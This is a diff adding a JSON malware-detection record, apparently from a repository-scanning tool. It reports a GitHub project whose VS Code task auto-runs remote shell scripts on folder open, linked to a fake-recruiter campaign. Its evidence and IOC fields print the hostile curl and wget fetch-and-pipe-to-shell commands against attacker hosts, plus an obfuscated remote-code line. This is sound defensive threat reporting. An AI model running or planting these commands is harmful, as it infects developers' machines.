@@ -1,0 +1,75 @@
+{
+  "finding": {
+    "key": "repository:ihzhatamamy/-magicdoor_property_rental",
+    "kind": "repository",
+    "family": "",
+    "id": "ihzhatamamy/-magicdoor_property_rental",
+    "url": "https://github.com/ihzhatamamy/-MagicDoor_Property_Rental",
+    "registry": "github",
+    "owner": "ihzhatamamy",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 9,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "GW-C-498a0aeb",
+    "rules": "install_hook/vscode-autorun; obfuscation/atob",
+    "evidence_locations": ".vscode/tasks.json:0; server/controllers/product.js:112",
+    "c2_hosts": "vscode-bootstrapper.vercel.app",
+    "iocs": "vscode-bootstrapper.vercel.app; https://vscode-bootstrapper.vercel.app/settings/mac?flag=307; https://vscode-bootstrapper.vercel.app/settings/linux?flag=307; curl 'https://vscode-bootstrapper.vercel.app/settings/mac?flag=307' | sh; .vscode/tasks.json",
+    "matched_signatures": "settings/mac?flag=; settings/windows?flag=",
+    "reasons": "Shares a confirmed-malware code signature ['settings/mac?flag=', 'settings/windows?flag='] | Tier-2 confirmed (bash score 9)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20261005T094859Z",
+    "last_seen": "hunt-20261005T094859Z",
+    "evidence_file": "repositories/ihzhatamamy_-magicdoor_property_rental.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://vscode-bootstrapper.vercel.app/settings/mac?flag=307' | sh wget -qO- 'https://vscode-bootstrapper.vercel.app/settings/linux?flag=307' | sh curl https://vscode-bootstrapper.vercel.app/set"
+    },
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://vscode-bootstrapper.vercel.app/settings/mac?flag=307' | sh wget -qO- 'https://vscode-bootstrapper.vercel.app/settings/linux?flag=307' | sh curl https://vscode-bootstrapper.vercel.app/set"
+    },
+    {
+      "file": "server/controllers/product.js",
+      "line": 112,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "axios.get(atob(constant.CONFIG_KEY)).then((res) => excuateHandler(res.data.cookie));"
+    }
+  ],
+  "commit_sha": "68449c0b807c6973e2147c07089e129efc878603",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/ihzhatamamy/-magicdoor_property_rental",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: settings/mac?flag=; settings/windows?flag=. The delivery method, a .vscode/tasks.json task that automatically runs a remote shell command the moment the repository is opened in VS Code, matches the DPRK-attributed 'Contagious Interview' campaign, in which fake recruiters lure developers into opening a coding-task repository that silently executes a first-stage downloader. The payload is fetched from attacker-controlled infrastructure: vscode-bootstrapper.vercel.app. This repository is one of 81 that Git Warden has confirmed as campaign GW-C-498a0aeb, which all deliver the same dropper URL shape (settings/{os}?flag=). The campaign spans 69 GitHub accounts. The other confirmed repositories are: https://github.com/123babayaga/zenithive_angular, https://github.com/aaryan121/code-conductor-fork, https://github.com/adan-asim/e-commerce-admin-app-backend, https://github.com/addis-ale/git_learn, https://github.com/adity-design/assessment, https://github.com/allzone-technologies/canteen-pwa, https://github.com/andre1917/challenge, https://github.com/anshuman-jha/toku_assestment, https://github.com/arnoldesquivel/best-city436-poc, https://github.com/bhoomikamehtastartbit/reactchakraui, https://github.com/crazydev13/school-management, https://github.com/dawit212119/eaglepoint-ai, https://github.com/dawit212119/ecommerce-backend, https://github.com/dishankchauhan/tech_test_pro-assignment, https://github.com/djeday123/test_repo1, https://github.com/dylanlittle/team-moshpit-project, https://github.com/eastmade/web3project-momo-token, https://github.com/eferos93/test4, https://github.com/emandeveloper/datascience, https://github.com/emigimenezj/solice2021-school-management-system, https://github.com/ethansliu/software_space_skill_test_problem_1, https://github.com/findusman/pos_backend, https://github.com/gauravraisharma/ticketting-system, https://github.com/hammad911/datavisualizationproject, https://github.com/haroldcalvo/workshop, https://github.com/helidonashabani/student-management, https://github.com/huncholane/defi_property, https://github.com/hvmgeeks/frontendengine1, https://github.com/jjin43/invelo_assessment, https://github.com/juanmantica123/funtico-tech-assestment, and 50 more. Across the campaign the payload is served from 18 distinct hosts: default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app, vscode-extension-260120.vercel.ap, vscode-extension-260120.vercel.app, vscode-extensions-bootstrap.vercel.app, vscode-helper-132.vercel.app, vscode-helper171-ruby.vercel.app, vscode-helper171.vercel.app, vscode-load-config.vercel.app, vscode-settings-bootstrap.vercel.app, vscode-settings-config-md.vercel.app, vscode-settings-config.ver, and 3 more. Matching only one host would miss most of the operation; matching the delivery shape found all of it. Attribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. The evidence behind this is: (1) Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape.",
+    "payload_description": "The malicious payload sits in .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. Detection rules that fired in this repository: install_hook/vscode-autorun (1 file), obfuscation/atob (1 file).",
+    "publisher": "ihzhatamamy",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/ihzhatamamy/-magicdoor_property_rental/blob/68449c0b807c6973e2147c07089e129efc878603/.vscode/tasks.json\nhttps://github.com/ihzhatamamy/-magicdoor_property_rental/blob/68449c0b807c6973e2147c07089e129efc878603/server/controllers/product.js#L112",
+    "verified_iocs": "vscode-bootstrapper.vercel.app\nhttps://vscode-bootstrapper.vercel.app/settings/mac?flag=307\nhttps://vscode-bootstrapper.vercel.app/settings/linux?flag=307\ncurl 'https://vscode-bootstrapper.vercel.app/settings/mac?flag=307' | sh\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-10-05T09:48:59Z",
+    "last_seen": "2026-10-05T09:48:59Z"
+  }
+}
